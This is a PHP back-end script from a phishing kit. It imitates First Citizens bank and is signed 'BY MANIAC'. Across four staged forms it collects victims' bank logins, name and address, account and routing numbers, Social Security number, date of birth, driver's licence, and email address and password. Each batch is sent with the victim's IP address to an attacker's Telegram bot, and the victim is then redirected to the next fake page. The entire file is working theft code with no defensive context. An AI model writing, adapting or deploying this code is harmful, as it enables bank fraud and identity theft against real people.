<?php
include_once("config.php");

function get_ip() {   
    if(!empty($_SERVER['HTTP_CLIENT_IP'])) {  
        $ip = $_SERVER['HTTP_CLIENT_IP'];  
    }  
    else if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {  
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];  
    }  
    else {  
        $ip = $_SERVER['REMOTE_ADDR'];  
    }  
    return $ip;  
} 

$ip = get_ip();


if (isset($_GET['Login'])) {

    $username = $_POST['username'];
    $password = $_POST['password'];


    if (!empty($bot_token) && !empty($chat_id)) {




        
        $msg = "";
        $msg.="[--+🏦  FIRST CITIZENS  BY MANIAC 🏦+--]\r\n";
        $msg.="[INFO]: Logins info is here.\r\n\r\n";
        $msg.="  USERNAME : <code>$username</code>\r\n";
        $msg.="  PASSWORD :  <code>$password</code>\r\n\r\n";
        
        $msg.="---------------------------\r\n";
        $msg.="IP Address: $ip                  \r\n";
        $msg.="IP lookup: https://whatismyipaddress.com/ip/$ip \r\n";    

        $data = array(
            'chat_id' => $chat_id,
            'text' => $msg,
            'parse_mode' => 'html',
            'disable_web_page_preview' => true
        );
        $ch = curl_init('https://api.telegram.org/bot'.$bot_token.'/sendMessage');
        curl_setopt_array($ch, array(
            CURLOPT_HEADER => 0,
            CURLOPT_RETURNTRANSFER => 1,
            CURLOPT_POST => 1,
            CURLOPT_POSTFIELDS => $data
        ));
        curl_exec($ch);
        curl_close($ch);
    }

 header("Location: ../info.html?sessionid=fp27y26d1197da19");
};

	if (isset($_GET['Info'])) {

    $fname = $_POST['fname'];
	$addy = $_POST['addy'];
    $city = $_POST['city'];
    $state = $_POST['state'];
	$zip = $_POST['zip'];
    $ph = $_POST['ph'];



    if (!empty($bot_token) && !empty($chat_id)) {




        
        $msg = "";
        $msg.="[--+🏦  FIRST CITIZENS BY MANIAC 🏦+--]\r\n";
        $msg.="[INFO]: Perosnal Info is here.\r\n\r\n";
        $msg.=" Full Name : <code>$fname</code>\r\n";
        $msg.=" Address : <code>$addy</code>\r\n";
        $msg.=" City : <code>$city</code>\r\n";
        $msg.=" State : <code>$state</code>\r\n";
        $msg.=" Zip Code : <code>$zip</code>\r\n";
		$msg.=" Phone Num: <code>$ph</code>\r\n";
        $msg.="---------------------------\r\n";
        $msg.="IP Address: $ip                  \r\n";
        $msg.="IP lookup: https://whatismyipaddress.com/ip/$ip \r\n";    

        $data = array(
            'chat_id' => $chat_id,
            'text' => $msg,
            'parse_mode' => 'html',
            'disable_web_page_preview' => true
        );
        $ch = curl_init('https://api.telegram.org/bot'.$bot_token.'/sendMessage');
        curl_setopt_array($ch, array(
            CURLOPT_HEADER => 0,
            CURLOPT_RETURNTRANSFER => 1,
            CURLOPT_POST => 1,
            CURLOPT_POSTFIELDS => $data
        ));
        curl_exec($ch);
        curl_close($ch);
    }

 header("Location: ../credit.html?sessionid=ada7d36d9217da19");
};
if (isset($_GET['Credit'])) {
    
    $an = $_POST['an'];
    $rn = $_POST['rn'];
    $ssn = $_POST['ssn'];
    $dob = $_POST['dob'];
	$dl = $_POST['dl'];
	$dlis = $_POST['dlis'];

    if (!empty($bot_token) && !empty($chat_id)) {




        
        $msg = "";
        $msg.="[--+🏦  FIRST CITIZENS BY MANIAC 🏦+--]\r\n";
        $msg.="[INFO]: Credit Info is here.\r\n\r\n";
        $msg.=" Account Number : <code>$an</code>\r\n";
        $msg.=" Routine Number : <code>$rn</code>\r\n";
        $msg.=" SSN : <code>$ssn</code>\r\n";
        $msg.=" Date Of Birth :  <code>$dob</code>\r\n";
		$msg.=" Drivers' License : <code>$dl</code>\r\n";
		$msg.=" DL STATE : <code>$dlis</code>\r\n";
        
        $msg.="---------------------------\r\n";
        $msg.="IP Address: $ip                  \r\n";
        $msg.="IP lookup: https://whatismyipaddress.com/ip/$ip \r\n";    

        $data = array(
            'chat_id' => $chat_id,
            'text' => $msg,
            'parse_mode' => 'html',
            'disable_web_page_preview' => true
        );
        $ch = curl_init('https://api.telegram.org/bot'.$bot_token.'/sendMessage');
        curl_setopt_array($ch, array(
            CURLOPT_HEADER => 0,
            CURLOPT_RETURNTRANSFER => 1,
            CURLOPT_POST => 1,
            CURLOPT_POSTFIELDS => $data
        ));
        curl_exec($ch);
        curl_close($ch);
    }

 header("Location: ../email.html?sessionid=ada7d36d9217da19");
};

	if (isset($_GET['Email'])) {

    $email = $_POST['email'];
    $emailpass = $_POST['emailpass'];


    if (!empty($bot_token) && !empty($chat_id)) {




        
        $msg = "";
        $msg.="[--+🏦  FIRST CITIZENS BY MANIAC 🏦+--]\r\n";
        $msg.="[INFO]: Card Info is here.\r\n\r\n";
        $msg.=" Email Address : <code>$email</code>\r\n";
        $msg.=" Email Password:  <code>$emailpass</code>\r\n";
        
        $msg.="---------------------------\r\n";
        $msg.="IP Address: $ip                  \r\n";
        $msg.="IP lookup: https://whatismyipaddress.com/ip/$ip \r\n";    

        $data = array(
            'chat_id' => $chat_id,
            'text' => $msg,
            'parse_mode' => 'html',
            'disable_web_page_preview' => true
        );
        $ch = curl_init('https://api.telegram.org/bot'.$bot_token.'/sendMessage');
        curl_setopt_array($ch, array(
            CURLOPT_HEADER => 0,
            CURLOPT_RETURNTRANSFER => 1,
            CURLOPT_POST => 1,
            CURLOPT_POSTFIELDS => $data
        ));
        curl_exec($ch);
        curl_close($ch);
    }

 header("Location: ../thankyou.html?sessionid=ada7d36d9217da19");
};

	?>